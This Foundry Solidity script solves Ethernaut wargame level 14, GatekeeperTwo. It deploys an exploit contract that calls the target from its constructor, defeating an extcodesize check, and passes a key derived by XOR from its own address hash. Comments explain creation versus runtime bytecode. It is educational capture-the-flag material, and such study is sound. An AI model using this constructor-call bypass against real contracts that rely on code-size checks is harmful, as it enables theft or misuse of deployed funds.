// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {GatekeeperTwo} from "src/14/GatekeeperTwo.sol";
import {GatekeeperTwoFactory} from "src/14/GatekeeperTwoFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";
import {console, Test} from "forge-std/Test.sol";

contract GatekeeperTwoExploit is Script {
    address public levelFactory;
    HelperConfig public config;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL14_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new GatekeeperTwoFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        // Break the contract
        new Exploit(GatekeeperTwo(instance));

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}

contract Exploit {
    GatekeeperTwo instance;

    constructor(GatekeeperTwo _instance) {
        instance = _instance;
        // XOR ^ operation is equivalent to A△B=(A∪B)−(A∩B) which gives A △ ((A∪B) - A) = A ∪ B if we consider A U B = MASK = type(uint64).max then it follows that :
        uint64 key = uint64((0xFFFFFFFFFFFFFFFF)) - uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        // or bytes8 key = bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xFFFFFFFFFFFFFFFF;

        // extcodesize(caller()) will return 0 if called from inside constructor
        // A contract has two different bytes codes when compiled
        // The creation bytecode and the runtime bytecode
        // The runtime bytecode is the real code of the contract, the one stored in the blockchain
        // The creation bytecode is the bytecode needed by Ethereum to create the contract and execute the constructor only once
        // When the constructor is executed initializing the contract storage it returns the runtime bytecode
        // Until the very end of the constructor the contract itself does not have any runtime bytecode
        // So if you call address(contract).code.length it will return 0!
        // If you want to read more about this at EVM level: https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-ii-creation-vs-runtime-6b9d60ecb44c/
        instance.enter(bytes8(key));
    }
}
